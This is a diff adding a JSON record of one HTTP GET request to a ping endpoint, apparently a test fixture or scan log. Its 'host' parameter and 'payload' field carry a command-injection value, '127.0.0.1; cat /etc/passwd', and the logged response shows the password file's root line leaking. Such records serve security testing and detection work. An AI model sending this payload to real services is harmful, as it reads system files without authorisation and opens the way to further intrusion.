@@ -1,0 +1,19 @@
+{
+  "url": "https://example.com/ping",
+  "method": "GET",
+  "headers": {
+    "User-Agent": "Mozilla/5.0",
+    "Accept": "text/html"
+  },
+  "params": {
+    "host": "127.0.0.1; cat /etc/passwd"
+  },
+  "body": "",
+  "payload": "127.0.0.1; cat /etc/passwd",
+  "response_status": 200,
+  "response_headers": {
+    "Content-Type": "text/html"
+  },
+  "response_body": "Pinging 127.0.0.1...\nroot:x:0:0:root:/root:/bin/bash\n...",
+  "timestamp": "2025-05-25T16:00:00Z"
+}
